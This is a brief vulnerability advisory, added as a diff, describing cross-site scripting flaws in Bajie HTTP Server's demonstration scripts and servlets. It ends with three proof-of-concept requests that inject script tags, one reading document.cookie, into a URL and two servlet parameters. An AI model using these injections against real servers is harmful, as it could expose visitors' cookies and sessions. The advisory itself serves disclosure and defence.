@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/8841/info
+
+Demonstration scripts and servlets that are distributed as part of Bajie HTTP Server have been reported prone to multiple cross-site scripting vulnerabilities.
+
+It has been reported that a remote attacker may construct a malicious link containing script and HTML code to any one of the vulnerable demonstration scripts or servlets on the affected server. If this link is followed the code contained therein will be rendered in the browser of the user who followed the link.
+
+http://www.example.com/cgi/bin/test.txt?<script>alert(document.cookie)</script>
+POST /servlet/custMsg?guestName=<script>alert("bang")</script> HTTP/1.0
+POST /servlet/CookieExample?cookiename=<script>alert("bang")</script>&cookievalue=&cookiepath=
+HTTP/1.0 
